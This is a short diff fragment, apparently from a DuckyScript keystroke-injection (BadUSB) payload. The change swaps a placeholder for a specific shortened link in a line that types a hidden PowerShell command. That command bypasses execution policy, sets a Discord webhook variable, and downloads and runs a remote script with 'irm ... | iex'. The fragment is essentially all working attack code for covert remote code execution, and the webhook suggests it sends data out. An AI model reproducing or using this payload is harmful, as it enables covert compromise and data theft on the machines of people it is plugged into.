@@ -36,5 +36,5 @@ DELAY 250
 DELETE
 STRING powershell -w h -ep bypass $discord='
 STRING WEBHOOK
-STRING ';irm bit.ly/TODO | iex
+STRING ';irm bit.ly/Hak5ProtonVPN-config | iex
 ENTER
